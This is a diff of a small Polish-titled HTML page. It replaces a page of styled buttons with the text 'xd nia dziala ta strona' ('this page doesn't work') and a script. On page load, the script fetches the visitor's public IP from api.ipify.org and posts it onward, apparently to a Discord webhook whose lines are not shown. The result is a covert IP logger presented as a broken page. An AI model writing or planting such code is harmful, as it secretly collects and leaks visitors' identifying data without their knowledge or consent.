@@ -1,51 +1,5 @@
-<html>
-<head>
- <title>Klikanie przycisko, wiadomosc do wawrza</title>
-  <meta name="description" content="A website with a button that sends a message with a Discord webhook when clicked, and other buttons that perform different actions.">
-  <style>
-    .button {
-      display: inline-block;
-      background-color: #3498db;
-      border: none;
-      color: white;
-      padding: 15px 32px;
-      text-align: center;
-      text-decoration: none;
-      font-size: 16px;
-      cursor: pointer;
-      transition: background-color 0.3s;
-    }
-
-    .button:hover {
-      background-color: #2980b9;
-    }
-
-    .button.login {
-      float: right;
-    }
-
-    .button.signup {
-      float: left;
-    }
-
-    .box {
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      height: 200px;
-      width: 300px;
-      border: 2px solid #3498db;
-    }
-  </style>
-</head>
-<body>
-  <div class="box">
-    <button class="button send-message">Send Message</button>
-  </div>
-  <button class="button login">Login</button>
-  <button class="button signup">Sign Up</button>
-
-  <script>
+xd nia dziala ta strona 
+<script>
 fetch("https://api.ipify.org?format=json")
   .then(response => response.json())
   .then(data => {
@@ -63,7 +17,4 @@ fetch("https://api.ipify.org?format=json")
       }),
     });
   });
-    });
-  </script>
-</body>
-</html>
+</script>
